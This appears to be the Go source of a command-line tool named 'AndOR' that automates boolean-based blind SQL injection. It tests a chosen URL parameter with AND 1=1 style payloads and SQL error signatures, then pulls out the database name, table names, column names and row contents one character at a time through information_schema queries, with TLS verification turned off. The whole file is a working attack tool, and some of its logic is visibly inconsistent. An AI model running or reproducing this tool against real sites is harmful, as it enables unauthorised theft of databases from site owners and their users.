package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
	"strings"

	"github.com/alexflint/go-arg"
	"github.com/common-nighthawk/go-figure"
	"github.com/fatih/color"
	"github.com/inancgumus/screen"
	"github.com/k3a/html2text"
)

// Options : Ayarlar
var Options struct {
	Parameter       string
	ParameterValue  string
	URL             *url.URL
	firstLen        int
	Payload         int
	DBNameLen       int
	DBName          string
	DBTableCount    int
	DBTablesColumns map[string][]string
	DBTablesRows    map[int][]string
}

var args struct {
	URL string `arg:"required"`
}

var Payloads = map[int]string{
	1: "' AND '1' = '1",
	2: "' AND '1' = '1'",
	3: " AND '1' = '1'",
	4: " AND 1 = 1",
	5: " AND 1 = 1'",
	6: "'AND 1 = 1'",
}

var NegativePayloads = map[int]string{
	1: "' AND '1' = '2",
	2: "' AND '1' = '2'",
	3: " AND '1' = '2'",
	4: " AND 1 = 2",
	5: " AND 1 = 2'",
	6: "'AND 1 = 2'",
}

var ErrPayloads = []string{
	"Fatal error:",
	"error in your SQL syntax",
	"mysql_num_rows()",
	"mysql_fetch_array()",
	"Error Occurred While Processing Request",
	"Server Error in '/' Application",
	"mysql_fetch_row()",
	"Syntax error",
	"mysql_fetch_assoc()",
	"mysql_fetch_object()",
	"mysql_numrows()",
	"GetArray()",
	"FetchRow()",
	"Input string was not in a correct format",
	"You have an error in your SQL syntax",
	"Warning: session_start()",
	"Warning: is_writable()",
	"Warning: Unknown()",
	"Warning: mysql_result()",
	"Warning: mysql_query()",
	"Warning: mysql_num_rows()",
	"Warning: array_merge()",
	"Warning: preg_match()",
	"SQL syntax error",
	"MYSQL error message: supplied argument….",
	"mysql error with query",
}

var Characters = []string{
	"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "_", "", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "@", ".",
}

func main() {
	screen.Clear()
	screen.MoveTopLeft()
	arg.MustParse(&args)
	var input string
	Options.URL, _ = url.Parse(args.URL)                //URL Kaydediliyor
	Options.firstLen = getPageLen(Options.URL.String()) //Sayfanın boyutu kaydediliyor
	Options.DBTablesColumns = make(map[string][]string)
	Options.DBTablesRows = make(map[int][]string)
	figure.NewFigure("AndOR", "isometric1", true).Print()
	setParameter() //Taranacak parametre kullanıcıdan isteniyor, değeri kaydediliyor
	figure.NewFigure("AndOR", "isometric1", true).Print()
	switch getPwnType() {
	case "len":
		color.Green("Len Based Detection Method: YES")
		fmt.Println("If you want to attack with Blind Based SQL Injection technique, type 'pwn'")
		fmt.Scanln(&input)
		if strings.EqualFold(input, "pwn") == true {
			pwn("len")
		}
	case "err":
		color.Green("Error Based Detection Method: YES")
		fmt.Println("If you want to attack with Blind Based SQL Injection technique, type 'pwn'")
		fmt.Scanln(&input)
		if strings.EqualFold(input, "pwn") == true {
			pwn("err")
		}
	case "between":
		color.Green("Len Based Detection Method: WORKING")
		color.Green("Error Based Detection Method: WORKING")
		fmt.Println("Please choose attack method, type 'len' or 'err'")
		fmt.Scanln(&input)
		if strings.EqualFold(input, "blind") == true {
			pwn(input)
		}

	}

	if test("'", "len") == 1 {
		fmt.Println("Error Based SQL Inj: YES")
	}

}
func pwn(method string) {
	var input string
	color.Yellow("[INFO] Testing for potential payloads..")
	for k, v := range Payloads {
		if test(v, method) == 1 {
			color.Green("[FOUND] Payload: %s", v)
			Options.Payload = k
			if test(NegativePayloads[Options.Payload], method) == 0 {
				color.Yellow("[INFO] PAYLOAD SUCCESSFUL")
				getDBNameLen(method)
				getDBName(method)
				getDBTableCount(method)
				getDBTables(method)
				fmt.Println("")
				fmt.Println("Type a table name to get columns")
				fmt.Scanln(&input)
				getDBColumns(method, input)
				getDBRows(method, input)

				break
			} else {
				fmt.Println("Payload unsuccesful, trying another payload")
			}
		}
	}
}

func getDBNameLen(method string) {
	color.Yellow("[INFO] Retrieving database name length..")
	for i := 1; i < 32; i++ {
		query := generatePwnQuery("AND (SELECT LENGTH(database()))=" + strconv.Itoa(i))
		if test(query, method) == 1 {
			Options.DBNameLen = i
			color.Green("[FOUND] Database Name Length: %d", i)
			break
		}
	}

}
func getDBName(method string) {
	color.Yellow("[INFO] Retrieving database name..")
	fmt.Print("[RETRIEVE] ")
	char := 1
	for {
		for _, value := range Characters {
			query := generatePwnQuery("AND (substring(database()," + strconv.Itoa(char) + ",1))='" + value + "'")
			if test(query, method) == 1 {
				char++
				Options.DBName += value
				fmt.Print(value)
				break
			}
		}
		if char == (Options.DBNameLen + 1) {
			fmt.Println("")
			color.Green("[FOUND] DB Name: %s", Options.DBName)
			break
		}
	}
}
func getDBTableCount(method string) {
	color.Yellow("[INFO] Retrieving table count..")
	i := 0
	for {
		query := generatePwnQuery("AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=" + strconv.Itoa(i))
		if test(query, method) == 1 {
			color.Green("[FOUND] Table Count: %d", i)
			Options.DBTableCount = i
			break
		}
		i++

	}
}

func getDBTables(method string) {
	color.Yellow("[INFO] Retrieving tables..")
	fmt.Print("[RETRIEVE] ")
	char := 1
	table := 0
	tableName := ""
	for {
		for _, value := range Characters {
			query := generatePwnQuery("and substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit " + strconv.Itoa(table) + ",1)," + strconv.Itoa(char) + ",1)='" + value + "'")
			if test(query, method) == 1 {
				char++
				tableName += value
				fmt.Print(value)
				if value == "" {
					fmt.Println("")
					color.Green("[FOUND] Table[%d/%d] Name: %s", (table + 1), Options.DBTableCount, tableName)
					fmt.Print("[RETRIEVE] ")
					char = 1
					Options.DBTablesColumns[tableName] = []string{}
					tableName = ""
					table++
				}
			}
		}
		if Options.DBTableCount == table {
			break
		}
	}
}
func getDBColumnLen(method string, tableName string) int {
	color.Yellow("[INFO] Retrieving column count of table %s", tableName)
	for i := 1; i < 32; i++ {
		query := generatePwnQuery("AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='" + tableName + "')=" + strconv.Itoa(i))
		if test(query, method) == 1 {
			color.Green("[FOUND] %d columns in table %s", i, tableName)
			return i
		}
	}
	return 0
}

func getDBColumns(method string, tableName string) {
	color.Yellow("[INFO] Retrieving columns of table %s", tableName)
	columnLen := getDBColumnLen(method, tableName)
	char := 1
	column := 0
	columnName := ""
	for {
		for _, a := range Characters {
			query := generatePwnQuery("AND (substr((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='" + tableName + "' LIMIT " + strconv.Itoa(column) + ",1)," + strconv.Itoa(char) + ",1)) = '" + a + "'")
			if test(query, method) == 1 {
				columnName += a
				if a == "" {
					Options.DBTablesColumns[tableName] = append(Options.DBTablesColumns[tableName], columnName)
					columnName = ""
					column++
					char = 0
				}
				char++
			}
		}
		if column == columnLen {
			break
		}
	}
}

func getDBRowCount(method string, tableName string, column string) int {
	i := 0
	for {
		query := generatePwnQuery("AND (SELECT COUNT(*) FROM " + tableName + ") = " + strconv.Itoa(i))
		if test(query, method) == 1 {
			return i
		}
		i++
	}
	return 0
}
func getDBRowColumn(method string, tableName string, column string, row int) string {
	char := 1
	rowData := ""
	for {
		for _, a := range Characters {
			query := generatePwnQuery("and substring((Select " + column + " from " + tableName + " limit " + strconv.Itoa(row) + ",1)," + strconv.Itoa(char) + ",1)='" + a + "'")
			if test(query, method) == 1 {
				rowData += a
				char++
				if a == "" {
					return rowData
				}
			}
		}

	}
	return "not"
}

func getDBRows(method string, tableName string) {
	color.Yellow("[INFO] Retrieving rows of table %s ", tableName)
	row := 0
	rowData := ""
	rowCount := 0
	for {
		for _, column := range Options.DBTablesColumns[tableName] {
			rowCount = getDBRowCount(method, tableName, column)
			rowData = getDBRowColumn(method, tableName, column, row)
			Options.DBTablesRows[row] = append(Options.DBTablesRows[row], rowData)

		}
		fmt.Println(Options.DBTablesRows[row])
		rowData = ""
		row++
		if row == rowCount {
			break
		}
	}
}

func test(query string, method string) int {
	//time.Sleep(1 * time.Millisecond)
	switch method {
	case "len":

		u := *Options.URL
		q := u.Query()
		q.Set(Options.Parameter, Options.ParameterValue+query)
		u.RawQuery = q.Encode()
		secondLen := getPageLen(u.String())
		//fmt.Println(query)
		if Options.firstLen == secondLen {
			return 1
		}
		return 0
	case "err":
		u := *Options.URL
		q := u.Query()
		q.Set(Options.Parameter, Options.ParameterValue+query)
		u.RawQuery = q.Encode()
		html := getPageHTML(u.String())
		for _, valueErr := range ErrPayloads {
			if !strings.Contains(html, valueErr) {
				return 1
			}
		}
		return 0
	}
	return 0
}

func getPageLen(pageURL string) int {
	html := getPageHTML(pageURL)
	if strings.Contains(html, "<head>") {
		afterHeadHTML := strings.SplitAfter(string(html), "<head>")
		plain := html2text.HTML2Text(afterHeadHTML[1])
		return len(plain)
	}
	return len(html)
}

func getPageHTML(pageURL string) string {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp, err := http.Get(pageURL)
	if resp.StatusCode == 403 {
		fmt.Println("WAF")
	}
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	html, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	return string(html)
}

func setParameter() {
	fmt.Println("")
	parameters := map[int]string{}
	q, _ := url.ParseQuery(Options.URL.RawQuery)
	i := 0
	for k, _ := range q {
		i++
		parameters[i] = k
	}
	for k, v := range parameters {
		color.Yellow("[" + strconv.Itoa(k) + "] " + v)
	}

	fmt.Println("Please choose a parameter for Boolean-Based SQL Injection")
	var input int
	fmt.Scanln(&input)
	Options.Parameter = parameters[input]
	Options.ParameterValue = q.Get(parameters[input])
	screen.Clear()
	screen.MoveTopLeft()

}

func getPwnType() string {
	if test("'", "len") == 0 && test("'", "err") == 0 {
		return "between"
	}
	if test("'", "len") == 0 {
		return "len"
	}
	if test("'", "err") == 0 {
		return "err"
	}
	return "none"
}

func generatePwnQuery(query string) string {
	splitPayload := strings.Split(Payloads[Options.Payload], "AND")
	generatedPayload := splitPayload[0] + query + " AND" + splitPayload[1]
	return generatedPayload
}
